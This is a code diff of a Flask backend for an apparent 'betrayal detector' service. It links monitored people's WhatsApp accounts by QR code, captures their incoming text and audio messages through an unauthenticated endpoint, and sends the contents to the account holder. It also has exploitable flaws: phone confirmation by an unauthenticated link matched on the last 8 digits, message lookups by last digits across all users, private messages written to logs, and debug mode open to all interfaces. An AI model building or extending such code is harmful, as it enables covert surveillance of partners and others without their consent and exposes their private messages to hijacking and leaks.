@@ -4,10 +4,10 @@ from werkzeug.security import generate_password_hash, check_password_hash
 import psycopg2
 from datetime import datetime, timedelta
 import requests
+import re
 from openai import OpenAI
 import tempfile
 import os
-import re
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -24,7 +24,6 @@ app.secret_key = os.getenv("FLASK_SECRET_KEY")
 login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = '/'
-
 
 def get_db():
     return psycopg2.connect(
@@ -70,17 +69,87 @@ def register():
     if request.method == 'POST':
         username = request.form['username']
         password = generate_password_hash(request.form['password'])
+        whatsapp_pai = request.form['username'].strip()  # Assumindo que username é o número do WhatsApp
+
+        # Normalizar o número do whatsapp_pai
+        numero = whatsapp_pai
+        if numero.startswith('+55'):
+            numero = numero[3:]
+        elif numero.startswith('55'):
+            numero = numero[2:]
+
+        # Validar o número (deve ter 10 ou 11 dígitos após remover +55 ou 55)
+        if not re.match(r'^\d{10,11}$', numero):
+            return render_template('register.html', erro="Número de WhatsApp inválido. Use o formato com DDD (ex: 5512345678900 ou +5512345678900).")
+
+        # Criar três variações do número
+        ddd = numero[:2]
+        resto = numero[2:]
+        numero_com_9 = f"{ddd}9{resto}" if len(resto) == 8 else numero  # Adiciona 9 após o DDD
+        numero_sem_9 = f"{ddd}{resto[1:]}" if len(resto) == 9 and resto[0] == '9' else numero  # Remove 9, se presente
+        numero_original = numero
+
+        # Adicionar +55 às variações
+        numeros_para_confirmacao = [
+            f"+55{numero_com_9}",
+            f"+55{numero_sem_9}",
+            f"+55{numero_original}"
+        ]
+
         try:
             conn = get_db()
             cur = conn.cursor()
+            # Inserir o usuário com o número original (será atualizado após confirmação)
             cur.execute("INSERT INTO usuarios (username, password, plano, whatsapp_pai, telefones_monitorados) VALUES (%s, %s, %s, %s, %s)",
-                        (username, password, 'Gratuito', username, []))
+                        (username, password, 'Gratuito', f"+55{numero_original}", []))
             conn.commit()
             conn.close()
-            return redirect(url_for('login'))
         except psycopg2.IntegrityError:
             return render_template('register.html', erro="Usuário já existe.")
+
+        # Enviar mensagens de confirmação para as três variações
+        for num in set(numeros_para_confirmacao):  # Evitar duplicatas
+            try:
+                confirmacao_url = f"https://detectordetraicao.digital/confirmar-numero/{num}"
+                mensagem = f"Confirme seu número de WhatsApp clicando no link: {confirmacao_url}"
+                response = requests.post("http://147.93.4.219:3000/enviar-confirmacao", json={
+                    "numeros": [num],
+                    "mensagem": mensagem
+                }, timeout=10)
+                response.raise_for_status()
+                print(f"Mensagem de confirmação enviada para {num}: {response.text}")
+            except Exception as e:
+                print(f"Erro ao enviar mensagem de confirmação para {num}: {str(e)}")
+
+        return redirect(url_for('login'))
     return render_template('register.html')
+
+@app.route('/confirmar-numero/<numero>', methods=['GET'])
+def confirmar_numero(numero):
+    if not numero.startswith('+'):
+        numero = f"+{numero}"
+    if not re.match(r'^\+\d{12,13}$', numero):
+        return jsonify({"erro": "Número inválido"}), 400
+
+    try:
+        conn = get_db()
+        cur = conn.cursor()
+        # Buscar usuário com base nos últimos 8 dígitos do whatsapp_pai
+        ultimos_8 = numero[-8:]
+        cur.execute("SELECT id FROM usuarios WHERE RIGHT(whatsapp_pai, 8) = %s", (ultimos_8,))
+        user = cur.fetchone()
+        if user:
+            user_id = user[0]
+            # Atualizar o whatsapp_pai com o número confirmado
+            cur.execute("UPDATE usuarios SET whatsapp_pai = %s WHERE id = %s", (numero, user_id))
+            conn.commit()
+            conn.close()
+            return jsonify({"status": "Número confirmado com sucesso"})
+        else:
+            conn.close()
+            return jsonify({"erro": "Usuário não encontrado"}), 404
+    except Exception as e:
+        return jsonify({"erro": f"Erro ao confirmar número: {str(e)}"}), 500
 
 @app.route('/logout')
 @login_required
@@ -111,7 +180,6 @@ def painel():
     max_filhos = limites.get(plano, 1)
 
     qr_code = None
-    # Não gera QR code para o pai na rota /painel
     return render_template(
         "painel.html",
         session_id=whatsapp_pai,
@@ -135,12 +203,13 @@ def excluir_filho(filho_id):
 
     filhos = resultado[0] or []
     if filho_id <= len(filhos):
-        numero_filho = filhos[filho_id - 1]  # Captura o número do filho a ser excluído
+        numero_filho = filhos[filho_id - 1]
+        if not numero_filho.startswith("+"):
+            numero_filho = f"+{numero_filho}"
         del filhos[filho_id - 1]
         cur.execute("UPDATE usuarios SET telefones_monitorados = %s WHERE id = %s", (filhos, current_user.id))
         conn.commit()
 
-        # Enviar comando para o Node.js excluir a sessão
         try:
             response = requests.post("http://147.93.4.219:3000/excluir-sessao", json={"numero": numero_filho}, timeout=10)
             response.raise_for_status()
@@ -155,10 +224,31 @@ def excluir_filho(filho_id):
 
     conn.close()
     return redirect(url_for("painel"))
+
 @app.route("/adicionar-filho", methods=["POST"])
 @login_required
 def adicionar_filho():
-    numero = request.form["numero"]
+    numero = request.form["numero"].strip()
+    if not numero.startswith("+"):
+        numero = f"+{numero}"
+    if not re.match(r"^\+\d{12,13}$", numero):
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("SELECT plano, telefones_monitorados FROM usuarios WHERE id = %s", (current_user.id,))
+        resultado = cur.fetchone()
+        plano = resultado[0]
+        filhos = resultado[1] or []
+        conn.close()
+        return render_template(
+            "painel.html",
+            erro="Número inválido. Use o formato internacional (ex: +5512345678900).",
+            session_id=current_user.username,
+            plano=plano,
+            filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
+            max_filhos=limites.get(plano, 1),
+            qr_code=None
+        )
+
     conn = get_db()
     cur = conn.cursor()
 
@@ -189,18 +279,26 @@ def adicionar_filho():
     if numero in filhos:
         conn.close()
         return render_template(
-        "painel.html",
-        erro="Este número já está cadastrado.",
-        session_id=current_user.username,
-        plano=plano,
-        filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
-        max_filhos=max_filhos,
-        qr_code=None
-    )
+            "painel.html",
+            erro="Este número já está cadastrado.",
+            session_id=current_user.username,
+            plano=plano,
+            filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
+            max_filhos=max_filhos,
+            qr_code=None
+        )
+
     filhos.append(numero)
     cur.execute("UPDATE usuarios SET telefones_monitorados = %s WHERE id = %s", (filhos, current_user.id))
     conn.commit()
     conn.close()
+
+    try:
+        response = requests.get(f"http://147.93.4.219:3000/qrcode/{numero}?force=true", timeout=10)
+        response.raise_for_status()
+        print(f"Solicitação de QR code enviada para {numero}: {response.text}")
+    except Exception as e:
+        print(f"Erro ao solicitar QR code para {numero}: {str(e)}")
 
     return redirect(url_for("painel"))
 
@@ -212,6 +310,8 @@ def status_conexao():
         status_resultados = {}
 
         for numero in numeros:
+            if not numero.startswith("+"):
+                numero = f"+{numero}"
             try:
                 resp = requests.get(f"http://147.93.4.219:3000/status-sessao/{numero}", timeout=5)
                 dados = resp.json()
@@ -226,6 +326,8 @@ def status_conexao():
 @app.route("/desconectar/<numero>", methods=["POST"])
 @login_required
 def desconectar(numero):
+    if not numero.startswith("+"):
+        numero = f"+{numero}"
     try:
         response = requests.post("http://147.93.4.219:3000/excluir-sessao", json={"numero": numero}, timeout=10)
         response.raise_for_status()
@@ -234,21 +336,9 @@ def desconectar(numero):
         print(f"Erro ao desconectar sessão para {numero}: {str(e)}")
         return jsonify({"erro": f"erro ao desconectar sessão: {str(e)}"}), 500
 
-
-@app.route("/solicitar-qrcode/<numero>")
-@login_required
-def solicitar_qrcode(numero):
-    try:
-        resp = requests.get(f"http://147.93.4.219:3000/qrcode/{numero}?force=true", timeout=10)
-        dados = resp.json()
-        return jsonify({"qrcode": dados.get("qrcode")})
-    except Exception as e:
-        return jsonify({"erro": str(e)}), 500
-
 @app.route("/mensagem-recebida", methods=["POST"])
 def mensagem_recebida():
     if request.content_type.startswith("multipart/form-data"):
-        # ÁUDIO
         numero_filho = '+' + request.form.get("para", "").strip('@s.whatsapp.net')
         numero_contato = '+' + request.form.get("de", "").strip('@s.whatsapp.net')
         horario_str = request.form.get("horario")
@@ -281,7 +371,6 @@ def mensagem_recebida():
                 os.remove(audio_path)
 
     else:
-        # TEXTO NORMAL
         data = request.get_json()
         numero_filho = '+' + data.get("para").strip('@s.whatsapp.net')
         numero_contato = '+' + data.get("de").strip('@s.whatsapp.net')
@@ -289,7 +378,6 @@ def mensagem_recebida():
         horario_str = data.get("horario")
         tipo = data.get("tipo")
 
-    # VERIFICAÇÕES PADRÃO (iguais ao seu código original)
     if not all([numero_filho, numero_contato, conteudo, horario_str]):
         return jsonify({"erro": "dados incompletos"}), 400
 
@@ -328,39 +416,41 @@ def disparar_relatorios():
         print("Consultando usuários no banco de dados...")
         cur.execute("SELECT id, whatsapp_pai, telefones_monitorados FROM usuarios WHERE whatsapp_pai IS NOT NULL")
         usuarios = cur.fetchall()
-        print(f"Usuários encontrados: {usuarios}")  # Depuração
+        print(f"Usuários encontrados: {usuarios}")
 
         for user_id, whatsapp_pai, telefones_monitorados in usuarios:
-            print(f"Processando usuário {user_id}, whatsapp_pai: {whatsapp_pai}, telefones_monitorados: {telefones_monitorados}")  # Depuração
+            print(f"Processando usuário {user_id}, whatsapp_pai: {whatsapp_pai}, telefones_monitorados: {telefones_monitorados}")
             if not telefones_monitorados:
                 print(f"Sem telefones monitorados para usuário {user_id}")
                 continue
 
             for numero_filho in telefones_monitorados:
-                print(f"Verificando mensagens para numero_filho: {numero_filho} (tipo: {type(numero_filho).__name__})")  # Depuração do tipo
+                if not numero_filho.startswith("+"):
+                    numero_filho = f"+{numero_filho}"
+                ultimos_8 = numero_filho[-8:]
+                print(f"Verificando mensagens para numero_filho: {numero_filho} (últimos 8: {ultimos_8})")
                 cur.execute("""
                     SELECT conteudo, horario FROM mensagens_monitoradas
-                    WHERE numero_filho = %s
+                    WHERE RIGHT(numero_filho, 8) = %s
                     ORDER BY horario DESC
-                """, (numero_filho,))
+                """, (ultimos_8,))
                 mensagens = cur.fetchall()
-                print(f"Mensagens para {numero_filho}: {mensagens} (count: {len(mensagens)})")  # Depuração com contagem
+                print(f"Mensagens para {numero_filho}: {mensagens} (count: {len(mensagens)})")
 
                 if not mensagens:
                     print(f"Nenhuma mensagem encontrada para {numero_filho}, verificando dados brutos...")
-                    cur.execute("SELECT * FROM mensagens_monitoradas WHERE numero_filho = %s", (numero_filho,))
+                    cur.execute("SELECT * FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s", (ultimos_8,))
                     dados_brutos = cur.fetchall()
                     print(f"Dados brutos para {numero_filho}: {dados_brutos}")
-                    continue  # Pula o envio se não houver mensagens
+                    continue
 
                 corpo = f"Relatório de mensagens do número {numero_filho}:\n"
                 for conteudo, horario in mensagens:
                     corpo += f"[{horario.strftime('%d/%m/%Y %H:%M')}] {conteudo}\n"
-                print(f"Gerando relatório para {whatsapp_pai}: {corpo}")  # Log detalhado
+                print(f"Gerando relatório para {whatsapp_pai}: {corpo}")
 
-                whatsapp_pai = whatsapp_pai.strip()
                 if not whatsapp_pai.startswith("+"):
-                    whatsapp_pai = "+" + whatsapp_pai
+                    whatsapp_pai = f"+{whatsapp_pai}"
 
                 try:
                     print(f"Enviando relatório para {whatsapp_pai} com corpo: {corpo[:100]}...")
@@ -372,8 +462,8 @@ def disparar_relatorios():
                     print(f"Relatório enviado para {whatsapp_pai} com status: {response.status_code} - {response.text}")
                     cur.execute("""
                         DELETE FROM mensagens_monitoradas
-                        WHERE numero_filho = %s
-                    """, (numero_filho,))  # Remove o filtro de tipo
+                        WHERE RIGHT(numero_filho, 8) = %s
+                    """, (ultimos_8,))
                     conn.commit()
                 except Exception as e:
                     print(f"Erro ao enviar relatório para {whatsapp_pai}: {str(e)}")
@@ -390,5 +480,6 @@ def disparar_relatorios():
     finally:
         if conn:
             conn.close()
+
 if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=5000)
